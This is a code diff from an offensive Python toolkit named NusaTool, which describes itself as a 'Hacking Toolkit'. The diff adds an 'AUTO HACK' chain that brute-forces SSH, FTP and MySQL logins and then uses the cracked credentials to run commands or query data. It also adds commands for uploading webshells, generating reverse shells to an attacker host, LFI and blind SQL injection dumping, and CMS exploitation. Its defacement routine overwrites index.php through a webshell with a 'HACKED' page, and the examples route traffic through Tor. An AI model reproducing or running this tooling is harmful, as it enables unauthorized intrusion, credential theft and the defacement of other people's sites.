+        for svc in ["ssh", "ftp", "mysql"]:
+            if svc == "ssh" and 22 in port_services:
+                pass
+            elif svc == "ftp" and 21 in port_services:
+                pass
+            elif svc == "mysql" and 3306 in port_services:
+                pass
+            else:
+                continue
+            try:
+                sb = ServiceBruteforcer(self.domain, None, svc, None, None, min(self.threads, 10))
+                found = sb.run()
+                if found:
+                    self.results["creds"].extend(found)
+                    self._log("brute", "ok", f"{svc}:{len(found)}")
+                    # Auto-exploit found creds
+                    for u, p in found[:3]:
+                        print(f"  {C}▶{N} Auto-exploiting {svc}:{Y}{u}:{p}{N}")
+                        try:
+                            if svc == "ssh":
+                                import paramiko
+                                client = paramiko.SSHClient()
+                                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                                client.connect(self.domain, username=u, password=p, timeout=5)
+                                _, stdout, _ = client.exec_command("id; uname -a; whoami; hostname")
+                                out = stdout.read().decode(errors='replace').strip()
+                                client.close()
+                                if out:
+                                    print(f"  {G}✔{N} SSH exec: {W}{out[:200]}{N}")
+                                    self.results["shells"].append({"url":f"ssh://{u}:{p}@{self.domain}","cmds":out})
+                            elif svc == "ftp":
+                                from ftplib import FTP
+                                ftp = FTP(self.domain)
+                                ftp.login(u, p)
+                                files = []
+                                try: ftp.retrlines('LIST', lambda x: files.append(x[:80]))
+                                except: pass
+                                ftp.quit()
+                                if files:
+                                    print(f"  {G}✔{N} FTP access: {len(files)} files")
+                                    self.results["creds"].append(f"ftp://{u}:{p}@{self.domain}")
+                            elif svc == "mysql":
+                                import pymysql
+                                conn = pymysql.connect(host=self.domain, user=u, password=p, connect_timeout=5)
+                                cur = conn.cursor()
+                                cur.execute("SELECT version(),database(),user()")
+                                row = cur.fetchone()
+                                conn.close()
+                                if row:
+                                    print(f"  {G}✔{N} MySQL: {Y}{row[0]}{N} db={row[1]} user={row[2]}")
+                                    self.results["creds"].append(f"mysql://{u}:{p}@{self.domain}")
+                        except Exception as e:
+                            print(f"  {Y}[−]{N} Auto-exploit {svc}: {e}")
+            except: self._log("brute", "fail", svc)
+
+        # SUMMARY
+        elapsed = time.time() - self.t0
+        print(f"\n  {R}{BOLD}{'═'*55}{N}")
+        print(f"  {R}{BOLD}AUTO HACK COMPLETE ({elapsed:.1f}s){N}")
+        print(f"  {R}{BOLD}{'═'*55}{N}")
+        print(f"\n  {R}◉{N} Shells: {Y}{len(self.results['shells'])}{N}")
+        print(f"  {G}◉{N} SQLi:   {Y}{'DATA' if self.results.get('sqli_data') else 'NONE'}{N}")
+        print(f"  {C}◉{N} Ports:  {Y}{len(self.results.get('ports',[]))}{N}")
+        print(f"  {M}◉{N} Creds:  {Y}{len(self.results.get('creds',[]))}{N}")
+        print()
+        # Generate report
+        try:
+            r = ReportGenerator()
+            r.target = self.target
+            for s in self.results.get("shells",[]):
+                r.add({"type":"SHELL","target":s.get("url",""),"detail":f"Webshell via {s.get('method','?')}","severity":"critical"})
+            for c in self.results.get("creds",[]):
+                if isinstance(c, tuple) and len(c)>=2: r.add({"type":"CREDS","target":c[0],"detail":f"{c[0]}:{c[1]}","severity":"high"})
+            for p in self.phases:
+                r.add_phase(p["phase"], p["status"], p.get("msg",""))
+            r.generate_html(f"autohack_{self.domain}.html")
+        except: pass
+        return self.results
+
+
+# ══════════════════════════════════════════════════════
 #  INTERACTIVE CLI
 # ══════════════════════════════════════════════════════
 
@@ -2168,7 +4080,7 @@ class NusaCLI:
     def banner(self):
         self.clear(); print(BANNER)
         print(f"  {D}{'═'*58}{N}")
-        print(f"  {C}{BOLD}◈{N}  {W}help{N}{D} for commands  |  {W}v{C}{VERSION}{N}  |  {R}AutoPwn{N}  {Y}Deface{N}  {M}Hash{N}  {C}Crack{N}  {G}Brute{N}")
+        print(f"  {R}{BOLD}⚡{N}{W}AUTO HACK{N}{D} |{N}{R} AutoPwn{N}{D} |{N}{Y}WebShell{N}{D} |{N}{M}RevShell{N}{D} |{N}{C}LFI{N}{D} |{N}{G}SQL{N}{D} |{N}{B}CMS{N}")
         print(f"  {D}{'═'*58}{N}\n")
     def prompt(self):
         return f"  {R}{BOLD}▶{N} {C}NusaTool{N} {R}{BOLD}❯{N} "
@@ -2188,45 +4100,66 @@ class NusaCLI:
             except (KeyboardInterrupt, EOFError): print(f"\n\n  {Y}👋 Goodbye!{N}\n"); self.running = False
     def _help(self):
         print(f"""
-  {C}╔═══════════════════════════════════════════════╗{N}
-  {C}║           {W}NUSA HACK TOOL {D}— {W}COMMANDS          {C}║{N}
-  {C}╚═══════════════════════════════════════════════╝{N}
+  {R}{BOLD}╔══════════════════════════════════════════════════════╗{N}
+  {R}{BOLD}║           {W}NUSA EXPLOIT {D}— {W}COMMANDS                    {R}{BOLD}║{N}
+  {R}{BOLD}╚══════════════════════════════════════════════════════╝{N}
 
-  {R}{BOLD}⚡ AUTOPWN{N}        {D}autopwn <target> [-p ports] [--threads N]{N}
-  {C}───────────────────────────────────────────────{N}
-  {R}◈ EXPLOIT / DEFACE{N}
-    {G}deface{N}         {D}-u <url>{N}
-    {G}urlscan{N}         {D}-u <url>{N}
-    {G}cors{N}            {D}-u <url>{N}
-    {G}csrf{N}            {D}-u <url>{N}
+  {R}{BOLD}⚡ AUTO HACK (Full Auto Exploitation Chain){N}
+    {G}autohack{N}        {D}<target> --lhost <ip> [--lport] [--threads] [--proxy]{N}
+    {G}autopwn{N}        {D}<target> [-p ports] [--threads N] [--proxy]{N}
+
+  {R}◈ ACTIVE EXPLOIT / SHELL{N}
+    {G}webshell{N}        {D}-u <url> [--shell php|asp|aspx|jsp|python] [--proxy]{N}
+    {G}revshell{N}        {D}--lhost <ip> [--lport 4444] [--lang bash|python|php|nc]{N}
+    {G}deface{N}         {D}-u <url> [--file <path>] [--webshell] [--message] [--proxy]{N}
+    {G}cms{N}             {D}-u <url> [--proxy]{N}
+    {G}svcexploit{N}     {D}--target <host> -u <user> -p <pass> [--service]{N}
+    {G}svcbrute{N}        {D}-t <host> --service ssh|ftp|mysql [--threads] [--proxy]{N}
+
+  {M}◈ WEB EXPLOIT / DUMP{N}
+    {G}blindsqli{N}       {D}-u <url> --param <name> [--tech auto|boolean|time] [--proxy]{N}
+    {G}lfi{N}             {D}-u <url> --param <name> [--proxy]{N}
+    {G}sqlauto{N}         {D}-u <url> [--param <name>] [--proxy]{N}
+    {G}cors{N}            {D}-u <url> [--proxy]{N}
+    {G}csrf{N}            {D}-u <url> [--proxy]{N}
+    {G}xss{N}            {D}-u <url> [--proxy]{N}
+    {G}sqli{N}           {D}-u <url> [--proxy]{N}
+    {G}urlscan{N}         {D}-u <url> [--proxy]{N}
+
   {Y}◈ RECON / OSINT{N}
-    {G}subdomain{N}      {D}-d <domain>{N}
-    {G}dns{N}            {D}-d <domain>{N}
+    {G}subdomain{N}      {D}-d <domain> [--wordlist] [--threads]{N}
+    {G}dns{N}            {D}-d <domain> [--record ALL|A|MX|NS]{N}
     {G}whois{N}          {D}-d <domain>{N}
-    {G}paramspider{N}    {D}-d <domain> [--subs] [--threads N]{N}
-    {G}scan{N}            {D}<domain>  (quick sweep: 60 common ports){N}
-  {M}◈ BRUTEFORCE / CRACK{N}
-    {G}autobf{N}          {D}<url>  (auto: just URL, detects everything){N}
-    {G}loginbf{N}        {D}-u <url> -U <users> -P <pass> [--threads N]{N}
+    {G}paramspider{N}    {D}-d <domain> [--subs] [--threads]{N}
+    {G}scan{N}            {D}<domain> [--proxy]{N}
+
+  {C}◈ BRUTEFORCE / CRACK{N}
+    {G}autobf{N}          {D}<url> [--threads] [--delay] [--proxy]{N}
+    {G}loginbf{N}        {D}-u <url> -U <users> -P <pass> [--threads] [--proxy]{N}
     {G}hashcrack{N}      {D}-t <hash> -w <wordlist> [--type md5|sha1|sha256]{N}
-    {G}dirbust{N}        {D}-u <url> -w <wordlist>{N}
-  {G}◈ NETWORK{N}
+    {G}dirbust{N}        {D}-u <url> -w <wordlist> [--ext] [--threads] [--proxy]{N}
+
+  {R}◈ SESSION / REPORT{N}
+    {G}report{N}         {D}[-o output.html] [--json] [--csv]{N}
+    {G}session save{N}   {D}[filename]{N}
+    {G}session load{N}   {D}<filename>{N}
+    {G}session show{N}   {D}[show current session status]{N}
+
+  {G}◈ NETWORK / MISC{N}
     {G}portscan{N}       {D}<target> [-p ports]{N}
     {G}servicedetect{N}  {D}-t <target> -p <ports>{N}
-    {G}cve{N}             {D}[no args — checks from banners]{N}
-  {G}◈ WEB VULN SCAN{N}
-    {G}xss{N}            {D}-u <url>{N}
-    {G}sqli{N}           {D}-u <url>{N}
-  {C}◈ REPORT{N}
-    {G}report{N}         {D}[-o output.html]{N}
-  {C}◈ UTILITY{N}          {G}help{N} | {G}clear{N} | {G}banner{N} | {G}version{N} | {G}exit{N}
+    {G}cve{N}             {D}[from banners]{N}
+    {G}version{N}        {D}[show version]{N}
+    {G}update{N}         {D}[check for updates]{N}
 
   {D}Examples:{N}
-    {C}autopwn http://testphp.vulnweb.com{N}
-    {C}deface -u https://target.com{N}
-    {C}autobf https://target.com/login{N}
-    {C}loginbf -u https://target.com/login -U users.txt -P pass.txt --threads 20{N}
-    {C}hashcrack -t 5f4dcc3b5aa765d61d8327deb882cf99 -w wordlist.txt{N}
+    {C}autohack http://target.com --lhost 10.0.0.5{N}
+    {C}webshell -u http://target.com/uploads --proxy socks5://127.0.0.1:9050{N}
+    {C}deface -u http://target.com/shell.php --webshell -m "HACKED"{N}
+    {C}revshell --lhost 10.0.0.5 --lport 4444 --lang python{N}
+    {C}lfi -u http://target.com/page.php?file=test --param file{N}
+    {C}blindsqli -u http://target.com/page.php?id=1 --param id --tech time{N}
+    {C}session save /tmp/hack1.json{N}
         """)
     def _get(self, args, *flags):
         for i, a in enumerate(args):
@@ -2259,8 +4192,10 @@ class NusaCLI:
                 if not t: print(f"  {R}✘{N} Usage: portscan <target> [-p ports]"); return
                 PortScanner(t, p).run()
             elif cmd == "paramspider":
-                d = self._get(args,"-d","--domain")
+                d = self._get(args,"-d","--domain") or self._get(args,"-u","--url")
                 if not d: print(f"  {R}✘{N} Usage: paramspider -d <domain> [--subs] [--threads N]"); return
+                # Strip http/https if user passed full URL
+                d = d.replace("http://","").replace("https://","").split("/")[0]
                 ParamSpider(d, "--subs" in args, int(self._get(args,"--threads") or "10")).run()
             elif cmd in ("autobf", "autologin"):
                 u = self._get(args,"-u","--url") or (args[0] if args and not args[0].startswith("-") else None)
@@ -2300,11 +4235,11 @@ class NusaCLI:
                 DirBruteforcer(u, w, self._get(args,"--ext"), int(self._get(args,"--threads") or "10"), BypassEngine(u)).run()
             elif cmd == "deface":
                 u = self._get(args,"-u","--url")
-                if not u: print(f"  {R}✘{N} Usage: deface -u <url> [--file <path>] [--content <html>]"); return
-                f = self._get(args,"-f","--file"); c = self._get(args,"-c","--content")
+                if not u: print(f"  {R}✘{N} Usage: deface -u <url> [--file <path>] [--content <html>] [--captcha <code>]"); return
+                f = self._get(args,"-f","--file"); c = self._get(args,"-c","--content"); cp = self._get(args,"--captcha")
                 dt = DefaceTester(u, BypassEngine(u))
                 if f or c:
-                    dt.deface(filepath=f, content=c)
+                    dt.deface(filepath=f, content=c, captcha_answer=cp)
                 else:
                     dt.scan()
             elif cmd in ("hashcrack", "hash"):
@@ -2325,8 +4260,89 @@ class NusaCLI:
                     mode=self._get(args,"--mode") or "form",
                     proxy=self._get(args,"--proxy"),
                     bypass=BypassEngine(u)).run()
+            elif cmd == "autohack":
+                target = self._get(args,"-u","--url") or self._get(args,"-t","--target") or (args[0] if args and not args[0].startswith("-") else None)
+                lhost = self._get(args,"--lhost")
+                lport = int(self._get(args,"--lport") or "4444")
+                threads = int(self._get(args,"--threads") or "20")
+                if not target: print(f"  {R}✘{N} Usage: autohack <target> --lhost <ip>"); return
+                if not lhost: print(f"  {Y}⚠{N} No --lhost set — skipping reverse shell phase")
+                AutoHack(target, lhost, lport, threads).run()
+            elif cmd == "webshell":
+                u = self._get(args,"-u","--url")
+                if not u: print(f"  {R}✘{N} Usage: webshell -u <url> [--shell php|asp|aspx|jsp|python] [--method put|post]"); return
+                shell_type = self._get(args,"--shell") or "php"
+                method = self._get(args,"--method") or "auto"
+                WebShell(u, BypassEngine(u)).run(shell_type, method)
+            elif cmd in ("revshell", "reverseshell"):
+                lhost = self._get(args,"--lhost")
+                lport = int(self._get(args,"--lport") or "4444")
+                lang = self._get(args,"--lang") or "bash"
+                if not lhost: print(f"  {R}✘{N} Usage: revshell --lhost <ip> [--lport 4444] [--lang bash|python|php|nc|powershell]"); return
+                ReverseShell(lhost, lport).run(lang, "--urlencode" in args)
+            elif cmd == "lfi":
+                u = self._get(args,"-u","--url")
+                param = self._get(args,"--param") or self._get(args,"-p")
+                if not u or not param: print(f"  {R}✘{N} Usage: lfi -u <url> --param <name>"); return
+                LFIExploiter(u, param, BypassEngine(u)).scan()
+            elif cmd in ("sqlauto", "sqlautodump"):
+                u = self._get(args,"-u","--url")
+                param = self._get(args,"--param")
+                if not u: print(f"  {R}✘{N} Usage: sqlauto -u <url> [--param <name>]"); return
+                SQLAutoExploit(u, "GET", param, BypassEngine(u)).dump_all()
+            elif cmd == "cms":
+                u = self._get(args,"-u","--url")
+                if not u: print(f"  {R}✘{N} Usage: cms -u <url>"); return
+                CMSExploiter(u, BypassEngine(u)).run()
+            elif cmd in ("svcexploit", "servicex"):
+                target = self._get(args,"--target") or self._get(args,"-t")
+                user = self._get(args,"-u","--user") or self._get(args,"-U","--username")
+                pwd = self._get(args,"-p","--pass") or self._get(args,"-P","--password")
+                svc = self._get(args,"--service") or "ssh"
+                port = self._get(args,"--port")
+                if not target or not user or not pwd:
+                    print(f"  {R}✘{N} Usage: svcexploit --target <host> -u <user> -p <pass> [--service ssh|ftp|mysql]")
+                    return
+                ServiceExploiter(target, user, pwd, int(port) if port else None).run([svc])
+            elif cmd in ("blindsqli", "blind-sqli"):
+                u = self._get(args,"-u","--url")
+                param = self._get(args,"--param") or self._get(args,"-p")
+                technique = self._get(args,"--tech") or "auto"
+                delay = float(self._get(args,"--delay") or "2")
+                if not u or not param: print(f"  {R}✘{N} Usage: blindsqli -u <url> --param <name> [--tech auto|boolean|time] [--delay 2]"); return
+                BlindSQLiExploiter(u, param, "GET", technique, delay, BypassEngine(u)).dump_all()
+            elif cmd in ("svcbrute", "servicebrute"):
+                target = self._get(args,"-t","--target") or self._get(args,"-u","--url")
+                svc = self._get(args,"--service") or "ssh"
+                port = self._get(args,"--port")
+                threads = int(self._get(args,"--threads") or "5")
+                wl_u = self._get(args,"-U","--usernames")
+                wl_p = self._get(args,"-P","--passwords")
+                if not target: print(f"  {R}✘{N} Usage: svcbrute -t <host> --service ssh|ftp|mysql [--port 22] [--threads 10]"); return
+                ServiceBruteforcer(target, int(port) if port else None, svc, wl_u, wl_p, threads).run()
             elif cmd == "report":
-                ReportGenerator().generate(self._get(args,"-o","--output") or "nusatool_report.html")
+                f = self._get(args,"-o","--output") or "nusatool_report.html"
+                if "--json" in args: ReportGenerator().generate_json(f=f.replace(".html",".json"))
+                elif "--csv" in args: ReportGenerator().generate_csv(f=f.replace(".html",".csv"))
+                else: ReportGenerator().generate_html(f)
+            elif cmd == "session":
+                sub = args[0] if args else ""
+                if sub == "save" and len(args) > 1:
+                    SessionManager(args[1]).save()
+                    print(f"  {G}✔{N} Session saved to {Y}{args[1]}{N}")
+                elif sub == "load" and len(args) > 1:
+                    s = SessionManager(args[1])
+                    if s.load(): print(f"  {G}✔{N} Loaded {len(s.data['findings'])} findings, {len(s.data['phases'])} phases")
+                    else: print(f"  {R}✘{N} Session file not found")
+                elif sub == "show":
+                    s = SessionManager()
+                    if s.load(): print(s.status())
+                    else: print(f"  {Y}⚠{N} No active session")
+                else: print(f"  {D}session save|load|show <file>{N}")
+            elif cmd == "update":
+                check_update()
+            elif cmd == "version":
+                print(f"\n  {C}NusaTool{N} {W}v{VERSION}{N}\n")
             else:
                 print(f"  {R}✘{N} Unknown: {Y}{cmd}{N}  {D}(try help){N}")
         except KeyboardInterrupt: print(f"\n  {Y}⚠ Interrupted{N}")
@@ -2351,13 +4367,15 @@ def direct(module, args):
             AutoPwn(target, wd, ports, threads).run()
         elif module in ("cors","csrf"):
             p = argparse.ArgumentParser(prog=module)
-            p.add_argument("-u","--url",required=True)
+            p.add_argument("-u","--url",required=True); p.add_argument("--proxy")
             a = p.parse_args(args)
-            (CORSScanner if module=="cors" else CSRFScanner)(a.url).scan()
+            be = BypassEngine(a.url, a.proxy)
+            (CORSScanner if module=="cors" else CSRFScanner)(a.url, be).scan()
         elif module == "urlscan":
             p = argparse.ArgumentParser(prog="urlscan")
-            p.add_argument("-u","--url",required=True)
-            a = p.parse_args(args); URLScanner(a.url).scan()
+            p.add_argument("-u","--url",required=True); p.add_argument("--proxy")
+            a = p.parse_args(args)
+            URLScanner(a.url, BypassEngine(a.url, a.proxy)).scan()
         elif module == "portscan":
             p = argparse.ArgumentParser(prog="portscan")
             p.add_argument("target",nargs="?"); p.add_argument("-t","--target",dest="tflag")
@@ -2368,8 +4386,13 @@ def direct(module, args):
             PortScanner(target,a.ports,a.timeout).run()
         elif module == "paramspider":
             p = argparse.ArgumentParser(prog="paramspider")
-            p.add_argument("-d","--domain",required=True); p.add_argument("--subs",action="store_true"); p.add_argument("--threads",type=int,default=10)
-            a = p.parse_args(args); ParamSpider(a.domain,a.subs,a.threads).run()
+            p.add_argument("-d","--domain",help="Domain name")
+            p.add_argument("-u","--url",help="Full URL (domain auto-extracted)")
+            p.add_argument("--subs",action="store_true"); p.add_argument("--threads",type=int,default=10)
+            a = p.parse_args(args)
+            domain = a.domain or (a.url.replace("http://","").replace("https://","").split("/")[0] if a.url else None)
+            if not domain: print("[-] Usage: paramspider -d <domain>"); return
+            ParamSpider(domain,a.subs,a.threads).run()
         elif module in ("autobf", "autologin"):
             p = argparse.ArgumentParser(prog="autobf")
             p.add_argument("url",nargs="?"); p.add_argument("-u","--url",dest="uflag")
@@ -2388,12 +4411,12 @@ def direct(module, args):
             a = p.parse_args(args); ServiceDetector(a.target,a.ports).run()
         elif module == "xss":
             p = argparse.ArgumentParser(prog="xss")
-            p.add_argument("-u","--url",required=True); p.add_argument("--method",default="GET"); p.add_argument("--param")
-            a = p.parse_args(args); XSSScanner(a.url,a.method,a.param,BypassEngine(a.url)).run()
+            p.add_argument("-u","--url",required=True); p.add_argument("--method",default="GET"); p.add_argument("--param"); p.add_argument("--proxy")
+            a = p.parse_args(args); XSSScanner(a.url,a.method,a.param,BypassEngine(a.url,a.proxy)).run()
         elif module == "sqli":
             p = argparse.ArgumentParser(prog="sqli")
-            p.add_argument("-u","--url",required=True); p.add_argument("--method",default="GET"); p.add_argument("--param")
-            a = p.parse_args(args); SQLiScanner(a.url,a.method,a.param,BypassEngine(a.url)).run()
+            p.add_argument("-u","--url",required=True); p.add_argument("--method",default="GET"); p.add_argument("--param"); p.add_argument("--proxy")
+            a = p.parse_args(args); SQLiScanner(a.url,a.method,a.param,BypassEngine(a.url,a.proxy)).run()
         elif module == "subdomain":
             p = argparse.ArgumentParser(prog="subdomain")
             p.add_argument("-d","--domain",required=True); p.add_argument("-w","--wordlist"); p.add_argument("--threads",type=int,default=20)
@@ -2409,19 +4432,55 @@ def direct(module, args):
         elif module == "dirbust":
             p = argparse.ArgumentParser(prog="dirbust")
             p.add_argument("-u","--url",required=True); p.add_argument("-w","--wordlist",required=True)
-            p.add_argument("--ext"); p.add_argument("--threads",type=int,default=10)
-            a = p.parse_args(args); DirBruteforcer(a.url,a.wordlist,a.ext,a.threads,BypassEngine(a.url)).run()
+            p.add_argument("--ext"); p.add_argument("--threads",type=int,default=10); p.add_argument("--proxy")
+            a = p.parse_args(args); DirBruteforcer(a.url,a.wordlist,a.ext,a.threads,BypassEngine(a.url,a.proxy)).run()
         elif module == "deface":
             p = argparse.ArgumentParser(prog="deface")
-            p.add_argument("-u","--url",required=True)
+            p.add_argument("-u","--url",required=True,help="Target URL or webshell URL")
             p.add_argument("-f","--file",help="Path to HTML file to upload")
             p.add_argument("-c","--content",help="Inline HTML content to upload")
+            p.add_argument("-m","--message",help="Short deface message (auto-generates page)")
+            p.add_argument("--target-file",default="index.php",help="File to overwrite (webshell mode)")
+            p.add_argument("--webshell",action="store_true",help="URL is a webshell endpoint")
+            p.add_argument("--captcha",help="Captcha answer for form submission")
+            p.add_argument("--proxy")
             a = p.parse_args(args)
-            dt = DefaceTester(a.url, BypassEngine(a.url))
-            if a.file or a.content:
-                dt.deface(filepath=a.file, content=a.content)
+            if a.webshell:
+                msg = a.message or a.content or "HACKED BY NUSATOOL"
+                content = a.content or f"""<!DOCTYPE html><html><head><title>Hacked</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{{background:#000;color:#0f0;text-align:center;padding-top:20vh;font-family:monospace}}h1{{font-size:4em;text-shadow:0 0 20px #0f0}}blink{{font-size:1.5em}}</style></head><body><h1>🔥 {msg} 🔥</h1><p style="color:#888">This site has been defaced via NusaTool</p></body></html>"""
+                if a.file:
+                    try:
+                        with open(a.file) as f: content = f.read()
+                    except Exception as e:
+                        print(f"  {R}✘{N} Failed to read file: {e}"); return
+                header("DEFACE — VIA WEBSHELL")
+                print(f"  {C}◉{N} Webshell : {Y}{a.url}{N}")
+                print(f"  {C}◉{N} Target   : {Y}{a.target_file}{N}")
+                print(f"  {C}◉{N} Size     : {Y}{len(content)}B{N}")
+                ws = WebShell(a.url, BypassEngine(a.url, a.proxy))
+                b64 = base64.b64encode(content.encode()).decode()
+                cmds = [
+                    f"echo '{b64}' | base64 -d > {a.target_file} && echo OK",
+                    f"echo '{b64}' | openssl enc -base64 -d > {a.target_file} && echo OK",
+                    f"php -r \"file_put_contents('{a.target_file}',base64_decode('{b64}'));echo'OK';\"",
+                ]
+                done = False
+                for cmd in cmds:
+                    out = ws.exec_cmd(a.url, cmd)
+                    if out and "OK" in out:
+                        base_url = a.url.split('?')[0].rsplit('/', 1)[0]
+                        print(f"  {G}✔{N} {BOLD}DEFACED{N} {Y}{base_url}/{a.target_file}{N}")
+                        print(f"  {W}Verify: {base_url}/{a.target_file}{N}")
+                        done = True
+                        break
+                if not done:
+                    print(f"  {R}✘{N} Deface via webshell failed. Check webshell URL.")
             else:
-                dt.scan()
+                dt = DefaceTester(a.url, BypassEngine(a.url, a.proxy))
+                if a.file or a.content:
+                    dt.deface(filepath=a.file, content=a.content, captcha_answer=a.captcha)
+                else:
+                    dt.scan()
         elif module in ("hashcrack", "hash"):
             p = argparse.ArgumentParser(prog="hashcrack")
             p.add_argument("-t","--target",required=True,help="Target hash")
@@ -2446,23 +4505,84 @@ def direct(module, args):
                 bypass=BypassEngine(a.url)).run()
         elif module == "report":
             p = argparse.ArgumentParser(prog="report")
-            p.add_argument("-o","--output",default="nusatool_report.html")
-            a = p.parse_args(args); ReportGenerator().generate_html(a.output)
+            p.add_argument("-o","--output",default="nusatool_report.html"); p.add_argument("--json",action="store_true"); p.add_argument("--csv",action="store_true")
+            a = p.parse_args(args)
+            if a.json: ReportGenerator().generate_json(f=a.output.replace(".html",".json"))
+            elif a.csv: ReportGenerator().generate_csv(f=a.output.replace(".html",".csv"))
+            else: ReportGenerator().generate_html(a.output)
+        elif module in ("autohack", "autohack"):
+            p = argparse.ArgumentParser(prog="autohack")
+            p.add_argument("target",nargs="?"); p.add_argument("-u","--url",dest="uflag")
+            p.add_argument("-t","--target",dest="tflag"); p.add_argument("--lhost"); p.add_argument("--lport",type=int,default=4444)
+            p.add_argument("--threads",type=int,default=20); p.add_argument("--proxy")
+            a = p.parse_args(args)
+            target = a.uflag or a.tflag or a.target
+            if not target: print("[-] Usage: autohack <target> --lhost <ip>"); return
+            AutoHack(target, a.lhost, a.lport, a.threads, a.proxy).run()
+        elif module == "webshell":
+            p = argparse.ArgumentParser(prog="webshell")
+            p.add_argument("-u","--url",required=True); p.add_argument("--shell",default="php")
+            p.add_argument("--method",choices=["auto","put","post"],default="auto"); p.add_argument("--proxy")
+            a = p.parse_args(args); WebShell(a.url, BypassEngine(a.url, a.proxy)).run(a.shell, a.method)
+        elif module in ("revshell","reverseshell"):
+            p = argparse.ArgumentParser(prog="revshell")
+            p.add_argument("--lhost",required=True); p.add_argument("--lport",type=int,default=4444)
+            p.add_argument("--lang",default="bash"); p.add_argument("--urlencode",action="store_true")
+            a = p.parse_args(args); ReverseShell(a.lhost, a.lport).run(a.lang, a.urlencode)
+        elif module == "lfi":
+            p = argparse.ArgumentParser(prog="lfi")
+            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True); p.add_argument("--proxy")
+            a = p.parse_args(args); LFIExploiter(a.url, a.param, BypassEngine(a.url, a.proxy)).scan()
+        elif module in ("sqlauto","sqlautodump"):
+            p = argparse.ArgumentParser(prog="sqlauto")
+            p.add_argument("-u","--url",required=True); p.add_argument("--param"); p.add_argument("--proxy")
+            a = p.parse_args(args); SQLAutoExploit(a.url, "GET", a.param, BypassEngine(a.url, a.proxy)).dump_all()
+        elif module == "cms":
+            p = argparse.ArgumentParser(prog="cms")
+            p.add_argument("-u","--url",required=True); p.add_argument("--proxy")
+            a = p.parse_args(args); CMSExploiter(a.url, BypassEngine(a.url, a.proxy)).run()
+        elif module in ("svcexploit","servicex"):
+            p = argparse.ArgumentParser(prog="svcexploit")
+            p.add_argument("--target",required=True); p.add_argument("-u","--user",required=True)
+            p.add_argument("-p","--pass",dest="password",required=True); p.add_argument("--service",default="ssh")
+            p.add_argument("--port",type=int)
+            a = p.parse_args(args)
+            ServiceExploiter(a.target, a.user, a.password, a.port).run([a.service])
+        elif module in ("blindsqli", "blind-sqli"):
+            p = argparse.ArgumentParser(prog="blindsqli")
+            p.add_argument("-u","--url",required=True); p.add_argument("--param",required=True)
+            p.add_argument("--tech",choices=["auto","boolean","time"],default="auto")
+            p.add_argument("--delay",type=float,default=2); p.add_argument("--proxy")
+            a = p.parse_args(args)
+            BlindSQLiExploiter(a.url, a.param, "GET", a.tech, a.delay, BypassEngine(a.url, a.proxy)).dump_all()
+        elif module in ("svcbrute", "servicebrute"):
+            p = argparse.ArgumentParser(prog="svcbrute")
+            p.add_argument("-t","--target",required=True); p.add_argument("--service",default="ssh")
+            p.add_argument("--port",type=int); p.add_argument("--threads",type=int,default=5)
+            p.add_argument("-U","--usernames"); p.add_argument("-P","--passwords"); p.add_argument("--proxy")
+            a = p.parse_args(args)
+            ServiceBruteforcer(a.target, a.port, a.service, a.usernames, a.passwords, a.threads).run()
         else:
             print(f"  {R}✘{N} Unknown: {Y}{module}{N}")
-            print(f"  {C}◈{N} Available: {G}autopwn scan cors csrf urlscan portscan servicedetect xss sqli deface subdomain dns whois dirbust loginbf autobf hashcrack paramspider report{N}")
+            print(f"  {C}◈{N} Available: {G}autohack autopwn webshell revshell lfi sqlauto blindsqli cms svcexploit svcbrute scan cors csrf urlscan portscan servicedetect xss sqli deface subdomain dns whois dirbust loginbf autobf hashcrack paramspider report session update{N}")
     except SystemExit: pass
     except Exception as e: print(f"  {R}✘ Error:{N} {e}")
 
 def main():
     p = argparse.ArgumentParser(description="NusaTool v1.2 — Hacking Toolkit")
     p.add_argument("--version", action="version", version=f"NusaTool v{VERSION}")
+    p.add_argument("--proxy", help="Proxy URL (e.g. socks5://127.0.0.1:9050)")
     if len(sys.argv) == 1: NusaCLI().run(); return
     if sys.argv[1] in ("-h","--help"): p.print_help(); print(f"\n  Run {C}nusatool.py{N} for interactive CLI\n"); return
     if sys.argv[1] == "--version": print(f"NusaTool v{VERSION}"); return
+    if sys.argv[1] == "update": check_update(); return
     if not sys.argv[1].startswith("-") and sys.argv[1] not in (
-        "autopwn","scan","cors","csrf","cve","urlscan","portscan","servicedetect",
-        "xss","sqli","subdomain","dns","whois","dirbust","loginbf","hashcrack","hash","report","paramspider","deface","autobf","autologin","help"):
+        "autohack","autopwn","scan","cors","csrf","cve","urlscan","portscan",
+        "servicedetect","xss","sqli","subdomain","dns","whois","dirbust",
+        "loginbf","hashcrack","hash","report","paramspider","deface","autobf",
+        "autologin","help","webshell","revshell","reverseshell","lfi","sqlauto",
+        "sqlautodump","cms","svcexploit","servicex","blindsqli","blind-sqli",
+        "svcbrute","servicebrute","session","update"):
         AutoPwn(sys.argv[1]).run(); return
     print(BANNER); direct(sys.argv[1], sys.argv[2:])
 
